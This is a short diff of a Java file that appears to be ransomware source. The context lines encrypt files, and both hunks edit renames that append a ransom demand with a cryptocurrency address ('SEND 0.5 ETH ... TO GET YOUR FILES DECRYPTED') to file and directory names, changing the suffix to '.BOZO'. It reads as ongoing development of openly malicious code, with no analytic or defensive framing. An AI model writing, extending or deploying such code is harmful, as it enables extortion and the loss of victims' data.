@@ -65,7 +65,7 @@ public class Main {
                 encryptFile(f,key,iv);
             }
             for(File f : dirs) {
-                f.renameTo(new File(f+" SEND 0.5 ETH TO 0xfb27bdE6EA0B7Dac4031A7B0ABA155E256150C1a TO GET YOUR FILES DECRYPTED"));
+                f.renameTo(new File(f+" SEND 0.5 ETH TO 0xfb27bdE6EA0B7Dac4031A7B0ABA155E256150C1a TO GET YOUR FILES DECRYPTED.BOZO"));
             }
         }catch(Exception e) {
             e.printStackTrace();
@@ -90,7 +90,7 @@ public class Main {
         }
         wr.close();
 
-        f.renameTo(new File(f+" SEND 0.5 ETH TO 0xfb27bdE6EA0B7Dac4031A7B0ABA155E256150C1a TO GET YOUR FILES DECRYPTED.java"));
+        f.renameTo(new File(f+" SEND 0.5 ETH TO 0xfb27bdE6EA0B7Dac4031A7B0ABA155E256150C1a TO GET YOUR FILES DECRYPTED.BOZO"));
     }
 
     public static void getFiles(File f) {
